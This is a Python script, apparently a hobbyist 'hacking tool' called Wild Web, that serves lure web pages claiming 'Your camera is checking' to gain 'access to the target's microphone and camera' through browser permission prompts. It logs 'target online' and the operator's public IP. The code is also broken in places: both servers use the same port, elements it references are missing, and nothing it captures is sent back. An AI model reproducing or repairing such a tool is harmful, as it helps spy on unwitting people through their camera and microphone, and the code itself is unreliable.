from email import message
from http.server import BaseHTTPRequestHandler, HTTPServer
import http.server
import socket
from requests import get
import time
from winsound import MessageBeep

class color:
	red = '\33[91m'
	blue = '\33[94m'
	green = '\33[92m'
	zard = '\33[93m'
	
print(f"""{color.red}
        DWO'                         DWO'
      'DfwO'                        'DfwO'  
    +DEoOw                            +DEoOw
   DoOPHD'                             DoOPHD'
 .DkOOd'                                'DoOow'
,x0Oo'                                   .EDroO   
  .c0WW0l.         ....''''...          .,d0Xk'   
    .c0NW0l'..':ldkOKXXNNNNXK0Okxl,.  .:kNWNO;    
      .c0WWX00XWMMMMMMMMMMMMMMMMMWNKkk0WMNk;.     
       .dNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMXl.      
     .c0NMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNx,     
   .:OWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMXx,   
  ,kNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWWNWMMMMMMMNd. 
 cKWMMMMMMWKdlldXWMMMMMMMMMMMMMMMWKo;,c0WMMMMMMWO;
cKMMMMMMMMK;    cNMMMMMMMMMMMMMMMX:    ;KMMMMMMMWK-► {color.zard} WILD WEB{color.red} 
KMMMMMMMMMKc   .dNMMMMMMMMMMMMMMMNd.   cXMMMMMMMMM-► {color.zard} Name tools : wild web{color.red} 
WMMMMMMMMMWXkooONMMWNNWMMMMMMXKNMMWKxdONMMMMMMMMMM-► {color.zard} channel : God developers{color.red}
MMMMMMMMMMMMMMMMMMMWOccxOKKKk:cKMMMMMMMMMMMMMMMMMM-► {color.zard} Send the file to the intruder's localhost {color.red}
MMMMMMMMMMMMMMMMMMMMNOl;,,;;;l0WMMMMMMMMMMMMMMMMMM-► {color.zard} Access : access to the target's micropho ne and camera{color.red}
MMMMMMMMMMMMMMMMMMMMMMWNK0O0XWMMMMMMMMMMMMMMMMMMMM
   ▏   ▏ 1                             2 ▏
   ▏   ╰╸► {color.green}Microphone           Camera{color.red}◄╺╯  
   ▏
   ╰╸► {color.green}https://github.com/Mr-Banana-2045
""")
num = input(f"{color.blue}╰─➤{color.green} Enter start -►>> ")
nameyou = input(f"{color.red}  ╰─➤{color.green} Specify your web name Camera -►>> ")
ip = get('https://api.ipify.org').text
class MyServer(BaseHTTPRequestHandler):
  def do_GET(self):
    self.send_response(200)
    self.log_message('target online')
    self.log_message(ip)
    self.address_string()
    self.send_header("Content-type", "text/html")
    self.end_headers()
    self.wfile.write(bytes("""
    	   			<html lang="fa"><head><style>	body{		background: black;		text-align: center;		}video{ display: block;}</style> <meta charset="UTF-8"> <title>God developers</title></head><body> <h1 style="background: green; color: red;"> Your camera is checking <h1> <video id="videoStream" width="920" height="920" autoplay></video> <canvas id="canvas" width="920" height="920"></canvas> </div>
<script> const video = document.getElementById('videoStream');const takeScreenshot = document.getElementById("takeScreenShot"); const canvas = document.getElementById("canvas");const context = canvas.getContext('2d'); 
if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) { navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) { video.srcObject = stream; video.play(); });}
takeScreenshot.addEventListener("click", function() { context.drawImage(video, 0, 0, video.getAttribute("width"), video.getAttribute("height"));}); </script></body></html>
>
""", "utf-8"))

class MyServere(BaseHTTPRequestHandler):
  def do_GET(self):
    self.send_response(200)
    self.log_message('target online')
    self.log_message(ip)
    self.send_header("Content-type", "text/html")
    self.end_headers()
    self.wfile.write(bytes("""
        			<html>
  <head>
    <title>God developers</title>
    <h1>I am MrBanana</h1>
    <body>
    <script>
    				var voice = {
  // (A) INIT SPEECH RECOGNITION
  sform : null, // HTML SEARCH FORM
  sfield : null, // HTML SEARCH FIELD
  sbtn : null, // HTML VOICE SEARCH BUTTON
  recog : null, // SPEECH RECOGNITION OBJECT
  init : () => {
    // (A1) GET HTML ELEMENTS
    // (A2) GET MICROPHONE ACCESS
    navigator.mediaDevices.getUserMedia({ audio: true })
    .then((stream) => {
      // (A3) SPEECH RECOGNITION OBJECT + SETTINGS
      const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
      voice.recog = new SpeechRecognition();
      voice.recog.lang = "fa-Ir";
      voice.recog.continuous = false;
      voice.recog.interimResults = false;
      // (A4) POPUPLATE SEARCH FIELD ON SPEECH RECOGNITION
      voice.recog.onresult = (evt) => {
        let said = evt.results[0][0].transcript.toLowerCase();
        voice.sfield.value = said;
        // voice.sform.submit();
        // OR RUN AN AJAX/FETCH SEARCH
        voice.stop();
      };
      // (A5) ON SPEECH RECOGNITION ERROR
      voice.recog.onerror = (err) => { console.error(err); };
      // (A6) READY!
    })
   }
 };
window.addEventListener("DOMContentLoaded", voice.init);
</script>
  </head>
  </body>
</html>""", "utf-8"))
nameyour = input(f"{color.red}  ╰─➤{color.green} Specify your web name Microphone -►>> ")
print(f"{color.blue}    LINK      ")
print(f"{color.blue}--------------")
if __name__ == "__main__":
    webServere = HTTPServer(('127.0.0.1', 8080), MyServere)
    print(f"{color.red}Server host Microphone :{color.zard} http//%s:%s%s%s%s%s{color.green}" % ('127.0.0.1', 8080,'/Microphone','.com','/',nameyour))
if __name__ == "__main__":        
    webServer = HTTPServer(('127.0.0.1', 8080), MyServer)
    print(f"{color.red}Server host Camera :{color.zard} http://%s:%s%s%s%s%s{color.green}" % ('127.0.0.1', 8080,'/Camera','.com','/',nameyou))

    try:
        webServer.serve_forever()
    except KeyboardInterrupt:
        pass

    webServer.server_close()
    print("Server stopp")